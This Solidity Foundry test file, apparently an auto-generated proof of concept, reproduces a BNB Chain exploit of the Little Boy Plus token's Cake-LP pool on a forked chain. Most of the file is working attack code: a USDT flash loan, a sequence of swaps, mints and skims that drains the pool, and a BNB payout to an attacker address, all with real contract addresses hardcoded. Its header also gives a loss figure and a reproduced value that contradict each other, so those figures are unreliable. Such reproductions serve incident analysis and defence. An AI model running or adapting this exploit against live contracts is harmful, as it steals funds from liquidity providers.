// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 534.31 USD
// Attacker : 0xb26dfe6b6180a30e2a2d9826867cc7e06631825a
// Attack Contract : 0x202ba7498c65f9f5c49b9c90953b562f9e0538fb
// Vulnerable Contract : N/A
// Attack Tx : 0x55856d9fda4c5be5193561c7d775e823c3d6e499da44aab9da963daf61c50b0c
// Block : 104727184
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 364.49K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 104727183;
    uint256 constant TX_TIMESTAMP = 1781685338;
    uint256 constant TX_BLOCK_NUMBER = 104727184;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _etchAttack();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchAttackChild();
        attack.bindAttackChild();
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), Addresses.attack_child);
    }

    function _etchAttack() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchAttackChild() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_515788_6D1A, address(0), Addresses.ZERO, "BNB", 605555786330933864102);
        _expectProfit(Addresses.attack_child, attackChild, Addresses.Cake_LP, "Cake-LP", 23218051024950574782538);
        _expectProfit(
            Addresses.attack_child, attackChild, Addresses.Little_Boy_Plus, "Little Boy Plus", 3881277202880720
        );
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        _bindChild();
    }

    function _bindChild() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(Addresses.attack_child));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindChild();
        return address(attackChild);
    }

    function attack() external payable {
        _bindChild();
        _runChildEntry();
    }

    function executeSetup() external payable {
        _bindChild();
        _runChildEntry();
    }

    function _runChildEntry() internal {
        address child = address(attackChild);
        require(child.code.length != 0, "attack child runtime missing");
        AttackChild(payable(child)).acceptCreateFrame();
        AttackChild(payable(child)).startFlashLoan();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        acceptTokenFallback();
    }

    function acceptTokenFallback() internal {}

    function bindAttackChild() external {
        attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    bytes4 private constant START_FLASH_LOAN = 0x5258a367;
    bytes32 private constant FLASH_LOAN_DONE = keccak256("poc.flashLoan.done");
    bytes32 private constant LOCK_DONE = keccak256("poc.lock.done");

    mapping(bytes32 => bool) private _callbackDone;

    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata callbackPayload) external payable {
        amount;
        callbackPayload;
        if (!_callbackDone[FLASH_LOAN_DONE]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function lockAcquired(bytes calldata lockPayload) external payable {
        lockPayload;
        if (!_callbackDone[LOCK_DONE]) executeLockedSwap();
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == START_FLASH_LOAN) {
            startFlashLoanFlow();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        acceptTokenFallback();
    }

    function flashCallback() external payable {
        if (!_callbackDone[FLASH_LOAN_DONE]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function startFlashLoan() external payable {
        startFlashLoanFlow();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback() external payable {
        if (!_callbackDone[LOCK_DONE]) executeLockedSwap();
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function acceptTokenFallback() internal {}

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function flashCallback2() internal {
        _callbackDone[FLASH_LOAN_DONE] = true;
        flashCallback3();
    }

    function flashCallback3() internal {
        IMoolahSettlement(Addresses.A_238A35_E6C4)
            .lock(hex"0000000000000000000000000000000000000000000000000000000000000000");
    }

    function startFlashLoanFlow() internal {
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.A_8F73B6_5D8C);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_8F73B6_5D8C);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_238A35_E6C4);

        IERC20Like(Addresses.WBNB).approve(Addresses.A_8F73B6_5D8C, type(uint256).max);
        IERC20Like(Addresses.USDT).approve(Addresses.A_8F73B6_5D8C, type(uint256).max);

        bytes memory flashLoanData = abi.encode(address(0));
        IMoolahFlashLender(Addresses.A_8F73B6_5D8C).flashLoan(Addresses.USDT, 7772960679833989887601242, flashLoanData);

        uint256 childUsdtBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(childUsdtBalance, _addressArray2(Addresses.USDT, Addresses.WBNB));
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_0DAE, childUsdtBalance);
        IUniswapV2PairLike(Addresses.Cake_LP_0DAE).swap(0, 610555786330933864102, address(this), hex"");
        IWBNB(Addresses.WBNB).withdraw(610555786330933864102);
        _tryNativeTransfer(Addresses.A_484848_4848, 5000000000000000000);
        uint256 payoutAmount = address(this).balance;
        if (payoutAmount > 605555786330933864102) payoutAmount = 605555786330933864102;
        _tryNativeTransfer(Addresses.A_515788_6D1A, payoutAmount);
    }

    function executeLockedSwap() internal {
        _callbackDone[LOCK_DONE] = true;
        drainLittleBoyPool();
        settleMoolahAndLp();
    }

    function drainLittleBoyPool() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_238A35_E6C4);
        uint256 moolahUsdtBalance = 34088143961844099311594944;
        IMoolahSettlement(Addresses.A_238A35_E6C4).take(Addresses.USDT, address(this), moolahUsdtBalance);
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(1000000000000000000000, _addressArray2(Addresses.USDT, Addresses.Little_Boy_Plus));
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 1000000000000000000000);
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 24339781623011675529, address(this), hex"");
        ICake_LP(Addresses.Cake_LP).getReserves();
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(address(this));
        IERC20Like(Addresses.Little_Boy_Plus).transfer(Addresses.Cake_LP, 24096383806781558774);
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 999770329154540264768);
        ICake_LP(Addresses.Cake_LP).mint(Addresses.Cake_LP);
        IPolVault(Addresses.PolVault).flushPol();
        IhLBP(Addresses.hLBP).bindReferral(Addresses.A_51EDEA_5CC2);
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 1000000000000000000);
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 1100000000000000, address(this), hex"");
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(15000000000000000000000000, _addressArray2(Addresses.USDT, Addresses.Little_Boy_Plus));
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 15000000000000000000000000);
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 10436185642129257030800, address(this), hex"");
        ICake_LP(Addresses.Cake_LP).getReserves();
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(Addresses.Cake_LP);
    }

    function settleMoolahAndLp() internal {
        IERC20Like(Addresses.Little_Boy_Plus).transfer(Addresses.Cake_LP, 115442628800700239012);
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 5790511652692109497206178);
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).mint(address(this));
        IERC20Like(Addresses.Little_Boy_Plus).transfer(address(this), 0);
        IERC20Like(Addresses.hLBP).transferFrom(Addresses.Cake_LP, Addresses.A_000000_DEAD, 0);
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(address(this));
        uint256 childLittleBoyBalance = 33234936188192519257374;
        IERC20Like(Addresses.Little_Boy_Plus).transfer(Addresses.Cake_LP, childLittleBoyBalance);
        ICake_LP(Addresses.Cake_LP).getReserves();
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(Addresses.Cake_LP);
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(141680718661980290585373, _addressArray2(Addresses.Little_Boy_Plus, Addresses.USDT));
        IUniswapV2PairLike(Addresses.Cake_LP).swap(21170154993871220994788545, 0, address(this), hex"");
        IMoolahSettlement(Addresses.A_238A35_E6C4).sync(Addresses.USDT);
        IERC20Like(Addresses.USDT).transfer(Addresses.A_238A35_E6C4, 34088143961844099311594944);
        IMoolahSettlement(Addresses.A_238A35_E6C4).settle();
    }

    function _tryNativeTransfer(address recipient, uint256 amount) internal {
        (bool ok,) = payable(recipient).call{value: amount}("");
        ok;
    }

    function acceptCreateFrame() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant Cake_LP = 0x00e3Ea08fD8CBaD955Ec5d2292Ad637670c31524;
    address internal constant PolVault = 0x01c87119a0D1C3730534b8d909eFeB1911b9fdB0;
    address internal constant A_078802_F1D3 = 0x0788022de7766432375556421D6283749E51f1D3;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant A_12EE1D_FE80 = 0x12eE1D7e7eA3e34c4D5A41372639742a3542fe80;
    address internal constant Cake_LP_0DAE = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attack_contract = 0x202bA7498C65F9F5C49b9c90953B562F9e0538FB;
    address internal constant A_238A35_E6C4 = 0x238a358808379702088667322f80aC48bAd5e6c4;
    address internal constant A_3665B3_B911 = 0x3665B3d4708B07Bd09F7C18724588FA65F2fb911;
    address internal constant A_484848_4848 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;
    address internal constant A_4D2728_8297 = 0x4d2728B2453137113F968D633D0398666f6A8297;
    address internal constant A_4DB412_4D45 = 0x4db412A4579be46311EEbCb3634bF146cAED4d45;
    address internal constant A_4E8F2E_8BF8 = 0x4E8F2e5a786aE47BC90f6A773b62d8e9103C8bf8;
    address internal constant A_4FD457_3C73 = 0x4Fd457E7DF94EEf150b079308b90E4144Df03C73;
    address internal constant A_515788_6D1A = 0x515788797914Cb663114aEb806B3CFb6096F6D1A;
    address internal constant A_51EDEA_5CC2 = 0x51EDEAb1CEa55570b246b3A1E42DAba9027c5cc2;
    address internal constant attack_child = 0x5449ded887576f43Fc339851e942eBc1E6F8118b;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant hLBP = 0x5E3cBc82D020be91a989Eb747934104E9AB585Fe;
    address internal constant A_6807DC_E0CB = 0x6807dc923806fE8Fd134338EABCA509979a7e0cB;
    address internal constant A_7062E3_E42B = 0x7062E324c73824F865Fd9AE9593693420cCfe42b;
    address internal constant A_7AE168_486F = 0x7aE1685AA6bB0847bD3f1a48bAa570dA878a486f;
    address internal constant A_86C9EF_46B5 = 0x86C9EFA66bb139cF96d510bF7Aa8363A64B946b5;
    address internal constant Little_Boy_Plus = 0x88886f0fD371dfF856291bAdcEd45922bC888888;
    address internal constant A_8D8D67_CA13 = 0x8d8d676E9C2E2D3a644A44DBd272742823DDCA13;
    address internal constant A_8F73B6_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant attacker_eoa = 0xb26DFE6b6180A30e2A2D9826867cc7e06631825a;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_BD1254_EFD8 = 0xbd1254c9Db282CB0Cb7772b4e90FF3186764EFD8;
    address internal constant A_C2C7AF_5016 = 0xC2c7Af29335386EeA1b84dF05567e21823865016;
    address internal constant LFOMO = 0xC6E06d3F7eD6475a555F4E23286a28F9Ed3c7E81;
    address internal constant A_CBD67B_69F0 = 0xCBd67b3464006C3687abdc83cE9B79D1a7d169F0;
    address internal constant BurnVault = 0xdBa2097923b75921657054Af11BE74475d2105Ee;
    address internal constant A_E0FC4F_EE06 = 0xE0fC4f1dbb94A311e9Fd7b4a7fc9Bd79B3d9ee06;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ICake_LP {
    function getReserves() external view;
    function mint(address) external returns (uint256);
    function skim(address) external;
}

interface IMoolahSettlement {
    function lock(bytes calldata) external;
    function settle() external returns (uint256);
    function sync(address) external;
    function take(address, address, uint256) external;
    function sync() external;
}

interface IMoolahFlashLender {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IPancakeRouter {
    function getAmountsOut(uint256, address[] calldata) external view;
}

interface IPolVault {
    function flushPol() external returns (uint256);
}

interface IWBNB {
    function withdraw(uint256) external;
}

interface IhLBP {
    function bindReferral(address) external;
}
